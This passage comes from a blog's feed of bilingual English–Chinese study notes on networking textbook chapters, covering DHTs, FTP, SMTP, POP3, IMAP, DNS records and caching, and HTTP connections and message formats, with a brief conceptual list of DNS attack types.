(key-value) pair in that matching peer; and if the key is larger than all the peer identifiers, we use a modulo-2^n^ convention, storing the(key-value) pair in the peer with the <strong>smallest</strong> identifier，如果该键恰好等于这些对等方标识符之一，我们在匹配的对等方中存储（键，值）对;如果该键大于所有对等方标识符，我们使用模2^n^规则，在具有最小标识符的对等方中存储（键，值）对</li></ul><h6 id="ircular-DHT，环形DHT">ircular DHT，环形DHT</h6><ul><li>each peer only keeps track of its immediate successor (modulo 2^n^),仅与直接后继和直接前任联系</li><li>each peer is only aware of its immediate successor,8 but does not necessarily know anything about any other peers that may be in the DHT</li><li>This circular arrangement of the peers is a special case of an <strong>overlay network</strong>(覆盖网络)<ul><li>In an overlay network, the peers form an abstract logical network(抽象的逻辑网络) which resides(存在) above the&quot;underlay(底层)&quot;computer network consisting of <strong>physical links</strong>, <strong>routers</strong>,and <strong>hosts</strong></li><li>The links in an overlay network <u>are not physical links</u>, but are simply <strong>virtual liaisons</strong>(虚拟联络) <u>between pairs of peers</u></li></ul></li><li>each peer is only aware of two peers, its <strong>immediate successor</strong> and <strong>its immediate predecessor</strong>. (By default, the peer is aware of its predecessor, since the predecessor is sending it messages.)</li><li>in the worst-case，<strong>N/2</strong> messages are sent on average</li><li>研究表明 DHT能被设计成每个对等方的邻居数量以及每个请求的报文数量均为O（log N），其中N是对等方的数量</li></ul><h6 id="Peer-Churn，对等方扰动">Peer Churn，对等方扰动</h6><ul><li>equire each peer to track(that is, know the IP address of) its <strong>first and second successor</strong></li><li>equire each peer to periodically verify(证明，证实) that its two successors are <strong>alive</strong> (for example,by periodically <strong>sending ping messages</strong> to them and asking for responses)</li><li>how a peer updates its state<ul><li>the peer replaces its first successor with its second successor</li><li>asks its new first successor for the identifier and IP address of its immediate successor  （makes peer 10 its second successor）</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第二章-应用层（三）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/</url>
    
    <content type="html"><![CDATA[<h1>2.3 File Transfer: FTP，文件传输协议∶FTP</h1><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/net2.14.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/net21.jpg" class=""><ul><li><p>the user interacts with FTP through an FTP user agent</p></li><li><p>:one:The user provides the <strong>hostname</strong> of the remote host</p><p>:two:the <strong>FTP client</strong> process in the local host to establish a <strong>TCP connection</strong> with the FTP server process in the remote host</p><p>:three:The <strong>user</strong> then provides the user <strong>identification and password</strong>, which are sent over the TCP connection as part of <strong>FTP commands</strong></p><p>:four:the <u>server</u> has <strong>authorized</strong>(授权) the user</p><p>:five:the <u>user</u> <strong>copies</strong> one or more files stored in the local file system into the remote file system</p></li><li><p>HTTP和FTP最显著的区别：FTP uses <strong>two parallel TCP connections</strong> to transfer a file（a <u>control</u> connection + a <u>data</u> connection）</p><ul><li>control connection：sending <u>control information</u> between the two hosts<ul><li>user identification</li><li>password</li><li>commands to change remote directory，改变远程目录的命令</li><li>commands to&quot;put&quot;and&quot;get&quot; files</li></ul></li></ul></li><li><p>Because FTP uses a <strong>separate control connection</strong>, FTP is said to send its <u>control</u> information <strong>out-of-band</strong>，称 FTP的控制信息是<u>带外</u>传送的</p></li><li><p>HTTP sends request and response header lines into the same TCP connection that carries the transferred file itself，so HTTP is said to send its <u>control</u> information in-band，HTTP 是带内发送<u>控制</u>信息的</p></li><li><p>SMTP sends <u>control</u> information <strong>in-band</strong></p></li><li><p>control TCP connectio：port21</p></li><li><p>The <u>client</u> side of FTP also sends, over the control connection, commands to change the remote directory</p></li><li><p>When the <u>server</u> side receives a command for a file transfer over the control connection，the <u>server</u> side initiates a <strong>TCP data connection</strong> to the client side</p></li><li><p><u>FTP</u> sends exactly <strong>one</strong> file over the data connection and then <u>closes</u> the data connection. If, during <u>the same session</u>, the user wants to transfer <u>another</u> file, FTP opens <u>another</u> <strong>data connection</strong></p></li><li><p>with FTP, the control connection <strong>remains open</strong> throughout the duration of the user session, but a new data connection is <strong>created for each file</strong> transferred within a session（non-persistent）</p></li><li><p>the FTP server must <strong>maintain state about the user</strong></p><ul><li>the server must <u>associate</u> the <strong>control connection</strong> with a <strong>specific user account</strong></li><li>the server must keep <u>track</u> of the user’s <strong>current directory</strong> as the user wanders about the remote directory tree</li><li>Keeping track of this state information for each ongoing user session significantly constrains the total number of sessions that FTP can maintain simultaneously，对每个进行中的用户会话的状态信息进行追踪，大大限制了FTP同时维持的会话总数</li></ul></li></ul><h3 id="2-3-1-FTP-Commands-and-Replies">2.3.1 FTP Commands and Replies</h3><ul><li><p>The commands, from client to server,and replies, from server to client, are sent across the control connection in <strong>7-bit ASCII format</strong></p></li><li><p>In order to delineate successive(连续的) commands,a carriage return and line feed end each command</p></li><li><p>Each command consists of <strong>four uppercase ASCII characters</strong>, some with optional arguments</p></li><li><p>SER username：Used to send the user identification to the server，传递用户标识</p></li><li><p>PASS password</p></li><li><p>LIST</p><ul><li>Used to ask the server to send back a list of all the files in the current remote directory，当前远程目录中的所有文件列表</li><li>The list of files is sent over a (<strong>new and non-persistent</strong>) data connection rather than the control TCP connection</li></ul></li><li><p>RETR filename：</p><ul><li>Used to <u>retrieve</u>(that is,get) a file from the current directory of the remote host</li><li>This command causes the remote host to initiate a <strong>data connection</strong> and to send the requested file over the data connection</li></ul></li><li><p>STOR filename</p><ul><li>Used to store(that is,put) a file into the current directory of the remote host.</li></ul></li><li><p>Each command is followed by a reply（three-digit numbers），with an optional message following the number</p></li><li><p>331 Username OK，password required</p></li><li><p>125 Data connection already open，transfer starting</p></li><li><p>425 Can’t open data connection</p></li><li><p>452 Error writing file（写文件差错）</p></li></ul><h1>2.4 ectronic Mail in the Internet，因特网中的电子邮件</h1><ul><li><p>e-mail is an <strong>asynchronous communication medium</strong>(异步通信媒介)：people send and read messages when it is convenient for them, without having to coordinate with other people’s schedules，不必与他人的计划进行协调</p></li><li><p>Internet mail system = user agents + mail servers + <strong>Simple Mail Transfer Protocol (SMTP)</strong></p></li><li><p>user agents allow users to read，reply to，forward，save，compose messages撰写报文</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/net2.22.jpg" class=""><ul><li>Mail <u>servers</u> form the <u>core</u> of the e-mail infrastructure</li><li>If A’s server cannot deliver mail to B’s server,<u>A’s server</u> holds the message in a message queue and attempts to transfer the message later. Reattempts are often done every <u>30</u> minutes or so; if there is no success after several days, the server removes the message and notifies the sender(A)with an e-mail message</li></ul></li><li><p>use the reliable data transfer service of <strong>TCP</strong></p></li><li><p>electronic mail is <strong>fast, easy to  distribute, and inexpensive</strong></p></li><li><p>Modern e -mail has many  powerful features</p><ul><li>messages with attachments,  hyperlinks, HTML -formatted  text, and embedded photos</li></ul></li></ul><h3 id="2-4-1-SMTP">2.4.1 SMTP</h3><ul><li>SMTP does <strong>not</strong> normally use <strong>intermediate</strong> mail servers for sending mail</li><li>if Bob’s mail <u>server</u> is down, the message remains in Alice’s mail server and waits for a new attempt—the message does not get placed in some intermediate mail server</li><li>所有邮件报文的体部分 （不只是其首部）只能采用简单的7比特ASCII表示</li><li>client SMTP has TCP establish a connection to port <strong>25</strong> at the server SMTP, <strong>persistent</strong> connection( 持久)</li><li>SMTP can count on the reliable data transfer service of <strong>TCP</strong> to get the message to the server without errors</li><li>The client then repeats this process over the <strong>same</strong> TCP connection if it has other messages to send to the server</li><li>three phases of transfer<ul><li>handshaking (greeting)</li><li>transfer of messages</li><li>closure</li></ul></li><li>command/response interaction (like  HTTP, FTP)</li><li>commands: ASCII text</li><li>response: status code and phrase</li></ul><h3 id="2-4-2-Comparison-with-HTTP">2.4.2 Comparison with HTTP</h3><ul><li>HTTP transfers files (also called objects)<u>from a Web server to a Web client</u>(typically a browser)</li></ul><p>SMTP transfers files(that is,e-mail messages) <u>from one mail server to another mail server</u></p><ul><li><p>When transferring the files, both persistent HTTP and SMTP use <strong>persistent</strong> connections</p></li><li><p>HTTP is mainly a <strong>pull</strong> protocol</p><p>SMTP is primarily a <strong>push</strong> protocol</p></li><li><p>SMTP requires each message, including the body of each message, to be in <strong>7-bit ASCII format</strong></p><ul><li>If the message contains characters that are not 7-bit ASCII(for example, French characters with accents)or contains binary data(such as an image file), then the message has to be <u>encoded</u> into 7-bit ASCII</li></ul></li><li><p>HTTP: each object encapsulated in its own  response msg(每个对象对应一个响应消息)</p><p>SMTP multiple objects sent in multipart  msg (所有对象放在一个消息中)</p></li></ul><h3 id="2-4-4-Mail-Access-Protocols">2.4.4 Mail Access Protocols</h3><ul><li>用户代理不能使用SMTP取回报文，因为取报文是一个拉操作，而 SMTP协议是一个<strong>推协议</strong></li><li>mail access protocols:<ul><li>Post Office Protocol—Version 3 (POP3),第三版的邮局协议</li><li>Internet Mail Access Protocol (IMAP),因特网邮件访问协议</li><li>HTTP</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/netmail.jpg" class=""><h6 id="POP3">POP3</h6><ul><li>POP3 begins when the <u>user agent</u> (the client) opens a TCP connection to the mail server(the server) on port <strong>110</strong></li><li>随着建立 TCP 连接，POP3按照三个阶段进行工作<ul><li>uthorization，特许<ul><li>the <u>user agent</u> sends a <strong>username</strong> and <strong>a password</strong>(口令) (in the clear，明文形式) to <u>authenticate</u>(鉴别) the user</li></ul></li><li>transaction，事务处理<ul><li>the user agent <u>retrieves</u>(取回) messages</li><li>also during this phase, the user agent can mark messages for deletion(删除标记), remove deletion marks, and obtain mail statistics(统计信息)</li></ul></li><li>update，更新<ul><li>occurs <u>after</u> the client has issued the <u>quit command</u>, ending the POP3 session</li><li>at this time, the mail server deletes the messages that were marked for deletion，删除那些被标记为删除的报文</li></ul></li><li>the server responds to each command with a reply</li><li>+OK<ul><li>sometimes followed by server-to-client data</li><li>used by the server to indicate that the previous command was fine</li></ul></li><li>and-ERR<ul><li>used by the server to indicate that something was wrong with the previous command</li></ul></li></ul></li><li>A user agent using POP3 can often be configured (by the user) to “<strong>download and delete</strong>&quot;or to&quot;<strong>download and keep</strong>”(可在不同设备上进行访问)</li><li>the POP3 server maintains some <strong>state information</strong>，in particular, it keeps track of which <strong>user messages have been marked deleted</strong> ， However, the POP3 server <strong>does not carry state information</strong> across POP3 sessions</li></ul><h6 id="IMAP">IMAP</h6><ul><li>the POP3 protocol does not provide any means for a user to create <u>remote folders</u> and assign messages to folders，创建远程文件夹并为报文指派文件夹</li><li>IMAP server will associate <u>each</u> message with a folder</li><li>when a message first arrives at the server, it is associated with the recipient’s INBOX folder</li><li>The recipient can then move the message into a new, user-created folder, read the message, delete the message</li><li>The IMAP protocol provides commands to allow users to create folders and move messages from one folder to another</li><li>provides commands that allow users to search remote folders for messages matching specific criteria</li><li>an IMAP server maintains <strong>user state information</strong> across MAP sessions</li></ul><h6 id="Web-Based-E-mail，基于Web的电子邮件">Web-Based E-mail，基于Web的电子邮件</h6><ul><li>the user agent is an ordinary Web browser, and the user communicates with its remote mailbox via HTTP</li><li>When a recipient, such as Bob, wants to access a message in his mailbox, the e-mail message is sent from Bob’s mail server to Bob’s browser using the HTTP protocol rather than the POP3 or IMAP protocol</li></ul><h1>2.5 DNS—The Internet’s Directory Service，DNS∶因特网的目录服务</h1><ul><li><p>hostname：主机名</p></li><li><p>一 个IP地址由4个字节组成，并有着严格的层次结构，每个字节都被句点分隔开来，表示了0~255的十进制数字</p></li></ul><h3 id="2-5-1-Services-Provided-by-DNS">2.5.1 Services Provided by DNS</h3><ul><li><strong>domain name system (DNS，域名系统)</strong><ul><li>a distributed database implemented in a hierarchy of DNS servers，一个由分层的 DNS 服务器实现的分布式数据库</li><li>an application-layer protocol that allows hosts to query the distributed database，一个使得主机能够查询分布式数据库的应用层协议</li></ul></li><li>The DNS servers are often <strong>UNIX machines</strong> running the <strong>Berkeley Internet Name Domain (BIND)</strong> software</li><li>The DNS protocol runs over <strong>UDP</strong> and uses <strong>port 53</strong></li><li>DNS is commonly employed by other application-layer protocols—including HTTP, SMTP, and FTP—to <strong>translate</strong> user-supplied hostnames to IP addresses<ul><li>The same user machine runs the client side of the DNS application，一台用户主机上运行着 DNS 应用的客户端</li><li>The browser extracts the hostname, the URL and passes the hostname to the client side of the DNS application</li><li>The DNS client sends a query containing the hostname to a DNS server</li><li>The DNS client eventually receives a reply, which includes the IP address for the hostname</li><li>Once the browser receives the IP address from DNS, it can initiate a TCP connection to the HTTP server process located at port 80 at that IP address</li></ul></li><li>DNS adds an additional <u>delay</u>，but the desired IP address is often cached in a&quot;nearby&quot;DNS server, which helps to reduce DNS network traffic as well as the average DNS delay</li><li>DNS 提供的其他服务<ul><li>Host aliasing（主机别名）<ul><li>对应有canonical hostname（规范主机名），DNS can be invoked by an application to obtain the canonical hostname for a supplied alias hostname as well as the IP address of the host</li></ul></li><li>mail server aliasing（邮件服务器别名）<ul><li>,the MX record(see below) permits a company’s mail server and Web server to have identical (aliased) hostnames</li></ul></li><li>Load distribution（负载分配）<ul><li>DNS is also used to perform load distribution among replicated servers, such as replicated Web servers</li><li>Busy sites are replicated over multiple servers, with each server running on a different end system and each having a different IP address</li><li>For replicated Web servers, a set of IP addresses is thus associated with one canonical hostname.The DNS database contains this set of IP address</li><li>When clients make a DNS query for a name mapped to a set of addresses, the server responds with the entire set of IP addresses, but rotates the ordering of the addresses within each reply</li><li>Because a client typically sends its HTTP request message to the IP address that is listed first in the set, DNS rotation distributes the traffic among the replicated servers</li><li>DNS rotation is also used for e-mail so that multiple mail servers can have the same alias name</li></ul></li></ul></li></ul><h3 id="2-5-2-Overview-of-How-DNS-Works">2.5.2 Overview of How DNS Works</h3><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/net23.jpg" class=""><ul><li>All DNS query and reply messages are sent within UDP datagrams to <strong>port 53</strong></li><li>采用集中式设计的问题，The problems with a centralized design include:<ul><li>A single point of failure，单点故障，牵一发而动全身</li><li>traffic volume，通信容量</li><li>Distant centralized database，远距离的集中式数据库：造成时延</li><li>Maintenance，维护<ul><li>single DNS server would have to keep records for all Internet hosts. Not only would this centralized database be huge, but it would have to be updated frequently to account for every new host</li></ul></li></ul></li><li>doesn’t scale(无扩展性)</li></ul><h6 id="A-Distributed-Hierarchical-Database，分布式、层次数据库">A Distributed, Hierarchical Database，分布式、层次数据库</h6><ul><li><p>In order to deal with the issue of <u>scale</u>(为了处理扩展性问题), the DNS uses a large number of servers, organized in a <u>hierarchical fashion</u> (分层方式) and distributed around the world</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/net24.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/net2.19.jpg" class=""></li><li><p>No single DNS server has all of the mappings(映射) for all of the hosts in the Internet</p></li><li><p>Root DNS servers：</p><ul><li>Although we have referred to each of the 13 root DNS servers as if it were a single server, each &quot;server&quot;is actually a cluster of replicated servers(冗余的), for both <strong>security</strong> and <strong>reliability</strong> purposes</li></ul></li><li><p>Top-level domain (TLD)servers：</p><ul><li>these servers are responsible for <strong>top-level domains</strong><ul><li>com</li><li>org</li><li>net</li><li>edu</li><li>gov</li></ul></li><li>all of the <strong>country</strong> top-level domains<ul><li>uk</li><li>fr</li><li>ca</li><li>jp</li></ul></li><li>The company <u>Network Solutions</u> maintains the TLD servers for the <strong>com</strong> top-level domain</li><li>the company <u>Educause</u> maintains the TLD servers for the <strong>edu</strong> top-level domain</li></ul></li><li><p>Authoritative DNS servers</p><ul><li>every organization with publicly accessible hosts (such as Web servers and mail servers)on the Internet must provide publicly accessible DNS records that map the names of those hosts to IP addresses，在因特网上具有公共可访问主机（如 Web服务器和邮件服务器）的每个组织机构必须提供公共可访问的 DNS 记录，这些记录将这些主机的名字映射为IP地址</li><li>An organization’s authoritative DNS server houses these DNS records</li></ul></li><li><p>local DNS server</p></li><li><p>does not strictly belong to the hierarchy of servers</p></li><li><p>Each ISP—such as a university, an academic department, an employee’s company, or a residential ISP—has a local DNS server(also called a default name server，默认名字服务器）</p></li><li><p>When a host makes a DNS query, the query is sent to the local DNS server, which acts a proxy, forwarding the query into the DNS server hierarchy</p></li><li><p>一台主机查询另一台主机的IP（ssumed that the TLD server knows the authoritative DNS server for the hostname，[not always true,Instead, the TLD server may know only of an intermediate DNS server, which in turn knows the authoritative DNS server for the hostname]）</p><ul><li><strong>recursive queries</strong>(递归查询) and <strong>iterative querie</strong>(迭代查询)</li><li><a href="http://xxx.edu">xxx.edu</a> 到local DNS server发出的查询是递归查询，因为该查询请求local DNS server以自己的名义获得该映射。后面的3个查询是迭代查询，因为所有的回答都是直接返回给local DNS server</li><li>从理论上讲，任何DNS 查询既可以是迭代的也能是递归的</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/net2.a.jpg" class=""></li></ul><h6 id="DNS-caching，DNS缓存">DNS caching，DNS缓存</h6><ul><li>in order to improve the delay performance and to reduce the number of DNS messages ricocheting around the Internet，改善时延性能并减少在因特网上到处传输的 DNS报文数量</li><li>hosts and mappings between hostnames and IP addresses are by no means permanent</li><li>DNS servers discard cached information after a period of time (often set to two days)</li><li>A local DNS server can also cache the IP addresses of <strong>TLD servers</strong>, thereby allowing the local DNS server to <u>bypass</u> the <strong>root DNS servers</strong> in a query chain(this often happens)</li></ul><h3 id="2-5-3-DNS-Records-and-Messages，DNS记录和报文">2.5.3 DNS Records and Messages，DNS记录和报文</h3><ul><li>the DNS servers that <u>together implement the DNS distributed database</u> store <strong>resource records(RRs，资源记录)</strong>,including RRs that provide hostname-to-IP address mappings</li><li>Each <strong>DNS reply message</strong> carries one or more resource records</li><li>A resource record is a four-tuple that contains the following fields: (<strong>Name,Value,Type,TTL</strong>)<ul><li>TTL is the time to live of the resource record，it determines when a resource should be removed from a cache，TTL是该记录的生存时间，它决定了资源记录应当从缓存中删除的时间</li><li>Name 和Value 的值取决于Type</li></ul></li></ul><table><thead><tr><th>Type</th><th>Name</th><th>Value</th><th>例</th></tr></thead><tbody><tr><td>A</td><td>hostname</td><td>IP address for the hostname</td><td>（relay1. bar. foo. com，145.37.93.126，A）</td></tr><tr><td>NS</td><td>domain</td><td>the hostname of an authoritative DNS server that knows how to obtain the IP addresses for hosts in the domain，Value 是个知道如何获得该域中主机IP地址的权威 DNS 服务器的主机名，这个记录用于沿着查询链来路由 DNS 查询</td><td>（<a href="http://foo.com">foo.com</a>，dns. <a href="http://foo.com">foo.com</a>，NS）</td></tr><tr><td>CNAME</td><td></td><td>nonical hostname for the alias(别名) hostname Name，别名为 Name 的主机对应的规范主机名</td><td>（<a href="http://foo.com">foo.com</a>，relayl. <a href="http://bar.foo.com">bar.foo.com</a>，CNAME）</td></tr><tr><td>MX</td><td></td><td>canonical name of a mail server that has an alias hostname Name，名为 Name 的邮件服务器的规范主机名</td><td>（<a href="http://foo.com">foo.com</a>，<a href="http://mail.bar.foo.com">mail.bar.foo.com</a>，MX）</td></tr></tbody></table><ul><li>if a DNS server is <u>authoritative</u> for a <u>particular</u> hostname, then the DNS server will contain a Type <strong>A</strong> record for the hostname.(Even if the DNS server is not authoritative, it may contain a Type A record in its cache.)</li><li>if a server is not authoritative for a hostname, then the server will contain a Type <strong>NS</strong> record for the domain that includes the hostname，it will also contain a Type <strong>A</strong> record that provides the IP address of the DNS server in the Value field of the NS record</li></ul><h6 id="DNS-message，DNS报文">DNS message，DNS报文</h6><ul><li><p>These are the <u>only</u> two kinds of DNS messages</p></li><li><p>both <strong>query</strong> and <strong>reply</strong> messages have the <u>same</u> format</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%823/net2.23.jpg" class=""><ul><li>the first 12 bytes is the <strong>header section</strong>(首部区域)<ul><li>identification(标识符)：16bits<ul><li>this identifier is <u>copied</u> into the <u>reply</u> message to a <u>query</u>, allowing the client to <strong>match</strong> received replies with sent queries</li><li>There are a number of flags in the flag field</li><li>A 1-bit query/reply flag indicates whether the message is a query (0)or a reply(1)</li><li>A 1-bit authoritative flag is set in a reply message when a DNS server is an authoritative server for a queried name，当某 DNS 服务器是所请求名字的权威 DNS 服务器时，1比特的&quot;权威的&quot;标志位被置在回答报文中</li><li>1-bit authoritative flag is set in a reply message when a DNS server is an authoritative server for a queried name，递归</li></ul></li><li>the <strong>question section</strong>(问题区域) contains information about the query that is being made<ul><li>name field</li><li>type field（A、MX）</li></ul></li><li><strong>answer section</strong>(回答区域) contains the <strong>resource records</strong> for the name that was originally queried<ul><li>A reply can return multiple RRs in the answer, since a hostname can have multiple IP addresses (for example, for replicated Web servers, as discussed earlier in this section)</li></ul></li></ul></li></ul></li><li><p>Attacking DNS</p><ul><li>DDoS attacks Bombard (轰炸) root  servers with traffic<ul><li>Not successful to date</li><li>Traffic Filtering</li><li>Local DNS servers cache IPs  of TLD servers, allowing root  server bypass</li></ul></li></ul></li><li><p>Bombard TLD servers</p></li><li><p>Potentially more dangerous</p></li><li><p>Redirect attacks</p><ul><li>Man-in-middle<ul><li>Intercept queries</li></ul></li><li>DNS poisoning<ul><li>Send bogus relies to DNS  server, which caches</li></ul></li></ul></li><li><p>Exploit DNS for DDoS</p><ul><li>Send queries with spoofed  source address: target IP</li><li>Requires amplification</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第二章-应用层（二）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/</url>
    
    <content type="html"><![CDATA[<h1>2.2The Web and HTTP</h1><h3 id="2-2-1-Overview-of-HTTP">2.2.1 Overview of HTTP</h3><ul><li><p>The <strong>HyperText Transfer Protocol (HTTP)</strong>, the Web’s application-layer protocol, is at the <u>heart</u> of the Web</p></li><li><p>HTTP is implemented（实现） in two programs：a client program and a server program</p></li><li><p>client program and server programa talk to each other by exchanging HTTP messages</p></li><li><p>HTTP defines the <strong>structure</strong> of these messages and <u>how the client and server exchange the messages</u></p></li><li><p>Web terminology</p><ul><li>URL：<a href="http://xn--tiqt5l0ys//%E8%B7%AF%E5%BE%84%E5%90%8D">http://主机名//路径名</a></li><li>Web servers：implement the server side of HTTP, house Web objects, each addressable by a URL，Web 服务器实现了HTTP的服务器端，它用于<strong>存储 Web 对象，每个对象由 URL寻址</strong></li></ul></li><li><p>HTTP defines how Web clients request Web pages from Web servers and how servers transfer Web pages to clients，HTTP定义了Web客户向Web服务器请求服务器的服务器 Web 页面的方式，以及服务器向客户传送Web页面的方式</p></li><li><p>HTTP uses <strong>TCP</strong> as its <u>underlying transport protocol</u>（底层传输协议）</p></li><li><p>the HTTP client first initiates a TCPconnection with the server. Once the connection is established, the browser and the server processes access TCP through their socket interfaces，HTTP客户首先发起一个与服务器的TCP 连接。一旦连接建立，该浏览器和服务器进程就可以通过套接字接口访问TCP</p></li><li><p>:star:the server sends requested files to clients <strong>without storing any state information about the client</strong></p></li><li><p>HTTP server maintains no information about the clients（ HTTP ：a <strong>stateless</strong> protocol，无状态协议）</p></li></ul><h3 id="2-2-2-Non-Persistent-and-Persistent-Connections，非持续连接和持续连接">2.2.2 Non-Persistent and Persistent Connections，非持续连接和持续连接</h3><ul><li>default mode：Persistent Connection</li></ul><h6 id="HTTP-with-Non-Persistent-Connections">HTTP with Non-Persistent Connections</h6><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/172121.jpg" class=""><ul><li><p>the HTTP client process initiates a TCP connection to the serve on port number 80.Associated with the TCP connection, there will be a socket at the client and a socket at the server</p></li><li><p>he HTTP client sends an HTTPrequest message to the server via its socket. The request message includes the path name</p></li><li><p>the HTTP server process receives the request message via its socket, retrieves the object, ,encapsulates the object in an HTTP response message,and sends the response message to the client via its socket</p></li><li><p>the HTTP server process tells TCP to close the TCP connection.(But TCP doesn’t actually terminate the connection until it knows for sure that the client has received the response message intact.)</p></li><li><p>The HTTP client receives the response message. The TCP connection terminates. The message indicates that the encapsulated object is an HTML file. The client extracts（提取） the file from the response message,examines the HTML file, and finds references to the 10 JPEG objects.</p></li><li><p>the first four steps are then repeated for each of the referenced JPEG objects.</p></li><li><p>HTTP has nothing to do with how a Web page is interpreted by a client，HTTP与客户如何解释一个Web页面毫无关系</p><p>The HTTP specifications define only the <strong>communication protocol</strong> between the client HTTP program and the server HTTP program</p></li><li><p>users can configure modern browsers to control the degree of parallelism. In their default modes, most browsers open 5 to 10 parallel TCP connections, and each of these connections handles one request-response transaction</p></li><li><p>round-trip time (RTT)：往返时间</p><ul><li><p>RTT= <strong>packet-propagation delays</strong>+<strong>packet-queuing delays</strong> in intermediate routers and switches+<strong>packet-processing delays</strong></p></li><li><p>例：点击一个超链接</p><ul><li><p>the browser to initiate a TCP connection between the browser and the Web server（involves a&quot;three-way handshake&quot;）</p></li><li><p>the client sends a small TCP segment to the server</p></li><li><p>the server acknowledges and responds with a small TCP segment</p></li><li><p>the client acknowledges back to the server</p></li></ul><p>（the first two parts of the three-way handshake take one RTT）</p><ul><li>the client sends the HTTP request message combined with the third part of he three-way handshake(the acknowledgment)into the TCP connection</li><li>Once the request message arrives at the server, the server sends the HTML file into the TCP connection</li><li>:star:the total response time is two RTTs plus the transmission time at the server of the HTML file</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/net2.7.jpg" class=""></li></ul></li><li><p>shortcomings</p><ul><li>a brand-new connection must be established and maintained for each requested object，必须为每一个请求的对象建立和维护一个全新的连接</li><li>For each of these connections, <strong>TCP buffers</strong> must be allocated and <strong>TCP variables</strong> must be kept in both the client and server，在客户和服务器中都要分配 TCP的缓冲区和保持TCP变量</li><li>can place a significant burden  on the Web server</li><li>each object suffers a delivery delay of <strong>two RTTs</strong>— one RTT to <u>establish</u> the TCP connection and one RTT to <u>request</u> and receive an object.</li></ul></li></ul><h6 id="HTTP-with-Persistent-Connections">HTTP with Persistent Connections</h6><ul><li>These requests for objects can be made back-to-back, without waiting for replies to pending requests (pipelining，流水线）</li><li>Typically,the HTTP server closes a connection when it isn’t used for a certain time (a configurable timeout interval）</li><li>client sends requests as  soon as it encounters a  referenced object</li><li>as little as <strong>one RTT</strong> for all  the referenced objects</li><li>The <u>default mode</u> of HTTP uses <u>persistent</u> connections with <u>pipelining</u></li></ul><h3 id="2-2-3-HTTP-Message-Format">2.2.3 HTTP Message Format</h3><h6 id="请求报文">请求报文</h6><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/net2.8.jpg" class=""><ul><li>written in ordinary ASCII text</li><li>each line followed by a <u>carriage return（回车）</u> and a <u>line feed（换行）</u></li><li>HTTP request message = request line(请求行，the first line) + the header lines（首部行）</li><li>request line has three fields<ul><li>the method field</li><li>the URL field</li><li>and the HTTP version field</li></ul></li><li>the method field：<ul><li>GET</li><li>POST</li><li>HEAD</li><li>PUT</li><li>DELETE</li></ul></li><li>也许会认为该首部行是不必要的，因为在该主机中已经有一条TCP连接存在了。 但是该首部行提供的信息是<strong>Web代理高速缓存</strong>所要求的</li><li>Connection: close =》Non-Persistent connection</li><li>User-agent: =》the browser type that is making the request to the server</li><li>useful：the server can actually <u>senddifferent versions</u>  of the same object to different types of user agents</li><li>a request generated with a form does <u>not necessarily</u> use the POST method</li><li>HEAD method：<ul><li>it responds with an <strong>HTTP message</strong> but it <u>leaves out the <strong>requested object</strong></u></li><li>always used in debugging</li></ul></li><li>PUT method<ul><li>allows a user to upload an object to a <u>specific</u> path (directory)on a <u>specific</u> Web server</li><li>also used by <u>applications</u> that need to upload objects to Web servers</li></ul></li><li>DELETE method<ul><li>allows a user, or an application,to delete an object on a Web server</li></ul></li></ul><h6 id="response-Message">response Message</h6><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/net2.9.jpg" class=""><ul><li><p>status line + header lines + entity body</p></li><li><p>status line = protocol version field + a status code+ a corresponding（对应的） status message</p></li><li><p>Date: <strong>header line indicates</strong> the time and date when the <strong>HTTP response was created</strong> and <strong>sent by the server</strong></p></li><li><p>Last-Modified: header line indicates the time and date when the <strong>object</strong> was created or last modif</p></li><li><p>Content-Type: header line indicates that the object in the entity body is HTML text. (The object type is officially indicated by the Content-Type: header and not by the file extension.)</p></li></ul><table><thead><tr><th>状态码</th><th>短语</th><th>解释</th></tr></thead><tbody><tr><td>200</td><td>🆗</td><td></td></tr><tr><td>301</td><td>Moved Permanently</td><td>请求的对象已经被永久转移了，新的 URL定义在响应报文的Location∶首部行中。客户软件将自动获取新的 URL</td></tr><tr><td>400</td><td>bad Request</td><td>this is a generic error code indicating that the request could not be understood by the server</td></tr><tr><td>404</td><td>Not 